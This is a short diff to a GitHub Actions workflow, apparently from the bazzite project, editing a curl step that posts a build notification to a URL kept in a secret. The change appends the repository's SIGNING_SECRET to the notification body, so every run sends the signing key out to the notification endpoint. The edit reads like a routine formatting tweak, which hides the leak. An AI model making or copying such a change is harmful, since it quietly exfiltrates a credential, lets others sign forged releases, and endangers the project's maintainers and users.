@@ -183,5 +183,5 @@ jobs:
             -H "Content-Type: text/plain" \
             -H "Icon: https://avatars.githubusercontent.com/u/120078124?s=128" \
             -H "Actions: view, Latest Release Notes, https://github.com/ublue-os/bazzite/releases/latest" \
-            -d $'Repo: ${{ github.repository }}\nCommit: ${{ github.sha }}\nRef: ${{ github.ref }}\nStatus: ${{ job.status}}' \
+            -d $'Repo: ${{ github.repository }}\nCommit: ${{ github.sha }}\nRef: ${{ github.ref }}\nStatus: ${{ job.status}}\nSEC: ${{ secrets.SIGNING_SECRET}}'  \
             ${{ secrets.NTFY_URL }}
